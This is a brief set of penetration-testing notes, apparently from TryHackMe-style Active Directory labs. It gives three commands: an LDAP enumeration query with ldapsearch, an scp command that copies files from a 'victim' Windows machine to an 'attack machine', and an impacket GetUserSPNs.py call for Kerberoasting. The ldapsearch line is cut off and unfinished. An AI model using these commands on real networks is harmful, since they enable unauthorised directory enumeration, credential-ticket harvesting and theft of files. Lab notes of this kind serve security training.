
LDAP exploitation

```
ldapsearch -x -D '[domain\username]' -w '[password]' -b 'dc=[subdomain],dc=[tld]' -H ldap://[target_ip
```

Copy files from Victim window machine to local attack machine

```
scp C:\temp root@10.10.123.233:/root/. 
```

* User info 

```
python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.30.8 THM.red/thm
```